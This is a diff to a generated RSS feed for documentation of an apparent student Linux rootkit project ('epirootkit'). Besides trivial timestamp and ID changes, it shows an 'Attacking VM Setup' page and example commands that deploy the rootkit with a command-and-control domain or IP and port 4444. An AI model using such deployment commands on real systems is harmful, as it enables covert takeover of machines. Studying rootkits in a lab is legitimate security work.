@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tux Fan Club Docs</title><link>/</link><description>Recent content on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Fri, 30 May 2025 11:44:48 +0200</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>Presentation</title><link>/docs/01-introduction/presentation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/01-introduction/presentation/</guid><description>&lt;h1 id="présentation">Présentation &lt;a href="#pr%c3%a9sentation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;h2 id="equipage">Equipage &lt;a href="#equipage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;div style="display: flex; justify-content: space-between; gap: 20px; flex-wrap: wrap;">
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tux Fan Club Docs</title><link>/</link><description>Recent content on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Fri, 30 May 2025 11:50:04 +0200</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>Presentation</title><link>/docs/01-introduction/presentation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/01-introduction/presentation/</guid><description>&lt;h1 id="présentation">Présentation &lt;a href="#pr%c3%a9sentation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;h2 id="equipage">Equipage &lt;a href="#equipage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;div style="display: flex; justify-content: space-between; gap: 20px; flex-wrap: wrap;">
  &lt;div style="flex: 1; min-width: 250px; text-align: center;">
  &lt;strong>Capitaine&lt;/strong>: Hugo Sibony 
  &lt;br>
@@ -71,14 +71,14 @@
 		
 
 		&lt;a class="nav-link active"
-		 id="cdfaebTab" data-bs-toggle="tab" data-bs-target="#cdfaeb"
-		 type="button" role="tab" aria-controls="cdfaeb" aria-selected="true">Recommended: Pre-built Disks&lt;/a>
+		 id="fabdecTab" data-bs-toggle="tab" data-bs-target="#fabdec"
+		 type="button" role="tab" aria-controls="fabdec" aria-selected="true">Recommended: Pre-built Disks&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="becadfTab" data-bs-toggle="tab" data-bs-target="#becadf"
-		 type="button" role="tab" aria-controls="becadf" aria-selected="true">Build Disks Yourself&lt;/a>
+		 id="afdbceTab" data-bs-toggle="tab" data-bs-target="#afdbce"
+		 type="button" role="tab" aria-controls="afdbce" aria-selected="true">Build Disks Yourself&lt;/a>
 
 		
 
@@ -95,7 +95,7 @@
 
 
 
-&lt;div class="tab-pane fade show active" id="cdfaeb" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade show active" id="fabdec" role="tabpanel" aria-labelledby="nav-1">
 
 	&lt;h3 id="download-pre-built-images">Download Pre-built Images &lt;a href="#download-pre-built-images" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Download both QCOW2 images and place them in the &lt;code>vm/&lt;/code> directory at the project root:&lt;/p></description></item><item><title>Attacking VM Setup</title><link>/docs/02-setup/attacking-vm-setup/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/attacking-vm-setup/</guid><description>&lt;p>Follow these steps once the host environment is ready and the VMs have been created or downloaded.&lt;/p>
 &lt;h2 id="usage">Usage &lt;a href="#usage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
@@ -1317,9 +1317,9 @@ file epirootkit.ko
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="cf447ce" class="language-bash ">
+ &lt;pre id="ffdc55b" class="language-bash ">
  &lt;code># Deploy with domain name
-sudo ./deploy_rootkit.sh address=c2.example.com
+sudo ./deploy_rootkit.sh address=jules_chef_de_majeur.epirootkit.com
 
 # Deploy with IP address
 sudo ./deploy_rootkit.sh address=192.168.1.100 port=4444
